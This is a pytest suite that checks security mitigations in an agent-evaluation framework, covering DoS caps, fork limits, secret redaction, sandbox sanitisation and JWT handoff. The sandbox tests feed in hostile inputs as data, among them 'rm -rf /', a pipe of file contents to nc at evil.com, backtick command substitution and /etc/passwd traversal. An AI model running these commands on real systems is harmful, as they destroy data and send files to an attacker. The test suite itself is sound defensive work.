"""
test_security_audit.py

Comprehensive test suite validating all 9 Enterprise Security Audit mitigations.
Each test maps to one or more numbered audit points from the implementation plan.
"""

import pytest
import asyncio
import copy
import types
import concurrent.futures
from unittest.mock import patch, MagicMock, AsyncMock
from pathlib import Path

# ──────────────────────────────────────────────────────────────────────────────
# Audit Point #1 — DoS: MAX_ENGINE_ATTEMPTS cap
# ──────────────────────────────────────────────────────────────────────────────


def test_dos_attempt_cap():
    """Verify that run_evaluation caps attempts at MAX_ENGINE_ATTEMPTS."""
    from eval_runner.engine import MAX_ENGINE_ATTEMPTS

    assert MAX_ENGINE_ATTEMPTS == 50, "Engine must enforce a hard cap of 50 attempts."


@pytest.mark.asyncio
async def test_dos_attempt_cap_clamp():
    """Requesting more than MAX_ENGINE_ATTEMPTS should be clamped."""
    from eval_runner import engine

    scenario = {
        "scenario_id": "dos-test",
        "tasks": [{"task_id": "t1", "description": "test", "success_criteria": []}],
    }

    with patch(
        "eval_runner.engine.AgentAdapterRegistry.call_agent", new_callable=AsyncMock
    ) as mock:
        mock.return_value = {"action": "final_answer", "summary": "ok"}
        results = await engine.run_evaluation(scenario, attempts=100)
        # Should have been clamped to 50
        assert len(results) == 50


# ──────────────────────────────────────────────────────────────────────────────
# Audit Point #6 — Fork Bomb Prevention
# ──────────────────────────────────────────────────────────────────────────────


def test_fork_bomb_depth():
    """SessionManager.fork() must raise at MAX_FORK_DEPTH."""
    from eval_runner.session import SessionManager, MAX_FORK_DEPTH

    # Create a session already at max depth
    scenario = {"scenario_id": "fork-depth", "tasks": [], "_fork_depth": MAX_FORK_DEPTH}
    session = SessionManager(scenario)
    with pytest.raises(RuntimeError, match="Fork Bomb Prevention"):
        session.fork([], {})


@pytest.mark.asyncio
async def test_fork_bomb_breadth(monkeypatch):
    """Branch action with too many branches should be rejected."""
    from eval_runner.session import SessionManager, MAX_FORK_BREADTH
    from eval_runner.engine import AgentAdapterRegistry

    scenario = {
        "scenario_id": "fork-breadth",
        "tasks": [{"task_id": "t1", "description": "test"}],
        "max_turns": 2,
    }

    async def mock_agent(payload, protocol="http"):
        return {
            "action": "branch",
            "branches": [
                {"name": f"b{i}", "message": "x"} for i in range(MAX_FORK_BREADTH + 1)
            ],
        }

    monkeypatch.setattr(AgentAdapterRegistry, "call_agent", mock_agent)
    session = SessionManager(scenario)
    # Should not crash — it simply breaks the loop
    results = await session.execute_tasks(1)
    assert results is not None


# ──────────────────────────────────────────────────────────────────────────────
# Audit Point #8 — Prototype Pollution / Frozen Context
# ──────────────────────────────────────────────────────────────────────────────


def test_context_immutability():
    """Frozen dataclass must reject attribute assignment."""
    from eval_runner.context import EvaluationContext, TurnContext

    ctx = EvaluationContext(scenario_id="x", scenario_data={"a": 1})
    with pytest.raises(AttributeError):
        ctx.scenario_id = "hacked"

    turn = TurnContext(task_id="t", turn_number=1, current_message="hi", history=[])
    with pytest.raises(AttributeError):
        turn.task_id = "hacked"


def test_context_history_deep_copy():
    """Mutating the original list should not affect the TurnContext history."""
    from eval_runner.context import TurnContext

    original = [{"role": "user", "content": "hello"}]
    turn = TurnContext(
        task_id="t1", turn_number=1, current_message="hi", history=original
    )

    # history is converted to tuple, so mutation of original list is irrelevant
    original.append({"role": "agent", "content": "world"})
    assert len(turn.history) == 1

    # Also verify the internal dict was deep-copied
    original[0]["content"] = "MUTATED"
    assert turn.history[0]["content"] == "hello"


def test_evaluation_context_frozen_dicts():
    """scenario_data and metadata should be read-only MappingProxyType."""
    from eval_runner.context import EvaluationContext

    ctx = EvaluationContext(
        scenario_id="x", scenario_data={"key": "val"}, metadata={"m": 1}
    )
    assert isinstance(ctx.scenario_data, types.MappingProxyType)
    assert isinstance(ctx.metadata, types.MappingProxyType)

    with pytest.raises(TypeError):
        ctx.scenario_data["key"] = "hacked"

    with pytest.raises(TypeError):
        ctx.metadata["m"] = 999


# ──────────────────────────────────────────────────────────────────────────────
# Audit Point #2 — PII / Secret Redaction
# ──────────────────────────────────────────────────────────────────────────────


def test_sanitize_jwt():
    """JWT tokens must be redacted."""
    from eval_runner.events import sanitize_payload

    data = {
        "token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.Q_w2AVguFXmVt"
    }
    result = sanitize_payload(data)
    assert "[REDACTED_JWT]" in result["token"]


def test_sanitize_aws_key():
    """AWS Access Key IDs must be redacted."""
    from eval_runner.events import sanitize_payload

    data = {"key": "AKIAIOSFODNN7EXAMPLE"}
    result = sanitize_payload(data)
    assert "[REDACTED_AWS_KEY]" in result["key"]


def test_sanitize_github_token():
    """GitHub PATs (ghp_) and OAuth tokens (gho_) must be redacted."""
    from eval_runner.events import sanitize_payload

    data_pat = {"token": "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl"}
    result_pat = sanitize_payload(data_pat)
    assert "[REDACTED_GITHUB_TOKEN]" in result_pat["token"]

    data_oauth = {"token": "gho_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkl"}
    result_oauth = sanitize_payload(data_oauth)
    assert "[REDACTED_GITHUB_TOKEN]" in result_oauth["token"]


def test_sanitize_bearer_token():
    """Bearer authorization headers must be redacted."""
    from eval_runner.events import sanitize_payload

    data = {"auth": "Bearer sk-live-abc123xyz456"}
    result = sanitize_payload(data)
    assert "Bearer [REDACTED]" in result["auth"]


def test_sanitize_format_string():
    """Format-string injection (`{`, `}`) must be neutralized."""
    from eval_runner.events import sanitize_payload

    data = {"payload": "{malicious_format}"}
    result = sanitize_payload(data)
    assert "{" not in result["payload"] or "{{" in result["payload"]


# ──────────────────────────────────────────────────────────────────────────────
# Audit Point #4 — Plugin Timeout Enforcement
# ──────────────────────────────────────────────────────────────────────────────


def test_plugin_timeout():
    """A hanging plugin hook should be terminated after PLUGIN_TIMEOUT."""
    from eval_runner.plugins import _invoke_with_timeout, PLUGIN_TIMEOUT
    import time

    def hanging_hook():
        time.sleep(PLUGIN_TIMEOUT + 5)

    with pytest.raises(concurrent.futures.TimeoutError):
        _invoke_with_timeout(hanging_hook)


# ──────────────────────────────────────────────────────────────────────────────
# Audit Point #5 — Sandbox Escape / Chroot
# ──────────────────────────────────────────────────────────────────────────────


def test_sandbox_path_traversal_key():
    """Path traversal in state keys must be neutralized."""
    from eval_runner.tool_sandbox import ToolSandbox

    assert ToolSandbox._sanitize_path("../../../etc/passwd") == "vfs:/passwd"
    assert ToolSandbox._sanitize_path("..\\..\\windows\\system32") == "vfs:/system32"
    assert ToolSandbox._sanitize_path("safe_key") == "safe_key"


def test_sandbox_path_traversal_value():
    """Path traversals in values must also be neutralized."""
    from eval_runner.tool_sandbox import ToolSandbox

    result = ToolSandbox._sanitize_value("../../../etc/passwd")
    assert "../" not in result
    assert "..\\" not in result


def test_sandbox_shell_metachar_strip():
    """Shell meta-characters must be removed from emitted values."""
    from eval_runner.tool_sandbox import ToolSandbox

    assert ";" not in ToolSandbox._sanitize_value("ls; rm -rf /")
    assert "|" not in ToolSandbox._sanitize_value("cat file | nc evil.com 1234")
    assert "&&" not in ToolSandbox._sanitize_value("true && malicious")
    assert "`" not in ToolSandbox._sanitize_value("`whoami`")


# ──────────────────────────────────────────────────────────────────────────────
# Audit Point #3 — CLI Namespace Isolation
# ──────────────────────────────────────────────────────────────────────────────


def test_cli_no_extend_cli():
    """BaseEvalPlugin must NOT have an extend_cli method (deprecated)."""
    from eval_runner.plugins import BaseEvalPlugin

    assert not hasattr(
        BaseEvalPlugin, "extend_cli"
    ), "extend_cli was deprecated in favor of on_register_commands."


# ──────────────────────────────────────────────────────────────────────────────
# Audit Point #7 — Repro Script RCE Prevention
# ──────────────────────────────────────────────────────────────────────────────


def test_repro_script_txt_extension(tmp_path, monkeypatch):
    """Reproduction scripts must be emitted as .txt, not .py/.sh."""
    from eval_runner.reporting_plugin import ReportingPlugin
    from eval_runner.context import EvaluationContext

    monkeypatch.chdir(tmp_path)
    ctx = EvaluationContext(scenario_id="rce-test", scenario_data={})
    plugin = ReportingPlugin()
    plugin.generate_repro_script(ctx)

    repro = tmp_path / "reports" / "repro" / "repro_rce-test.txt"
    assert repro.exists(), "Repro script should be a .txt file"
    assert not (tmp_path / "reports" / "repro" / "repro_rce-test.py").exists()
    assert not (tmp_path / "reports" / "repro" / "repro_rce-test.sh").exists()


def test_repro_script_rce_strip(tmp_path, monkeypatch):
    """os.system and subprocess strings must be stripped from repro scripts."""
    from eval_runner.reporting_plugin import ReportingPlugin
    from eval_runner.context import EvaluationContext

    monkeypatch.chdir(tmp_path)
    ctx = EvaluationContext(scenario_id="rce-strip", scenario_data={})
    plugin = ReportingPlugin()
    plugin.generate_repro_script(ctx)

    repro = tmp_path / "reports" / "repro" / "repro_rce-strip.txt"
    content = repro.read_text()
    assert "os.system" not in content
    assert "subprocess" not in content


# ──────────────────────────────────────────────────────────────────────────────
# Audit Point #9 — Plugin GUI Hijacking / JWT Handoff
# ──────────────────────────────────────────────────────────────────────────────


def test_auth_jwt_generation():
    """Verify that generate_handoff_token creates a short-lived HS256 JWT."""
    from eval_runner.console.auth import generate_handoff_token, SECRET_KEY
    import jwt

    token = generate_handoff_token()
    decoded = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

    assert decoded["sub"] == "admin-user"
    assert decoded["scope"] == "console-handoff"
    assert "exp" in decoded


def test_auth_handoff_decorator():
    """Verify that @handoff_required enforces token presence and validity."""
    from eval_runner.console.auth import handoff_required, generate_handoff_token
    from flask import Flask, request, jsonify

    app = Flask(__name__)

    @app.route("/test")
    @handoff_required
    def protected():
        return jsonify({"status": "ok"})

    with app.test_request_context("/test"):
        # No token
        response, status = protected()
        assert status == 401

    with app.test_request_context("/test?token=invalid"):
        # Invalid token
        response, status = protected()
        assert status == 401

    valid_token = generate_handoff_token()
    with app.test_request_context(f"/test?token={valid_token}"):
        # Valid token
        response = protected()
        assert response.json["status"] == "ok"
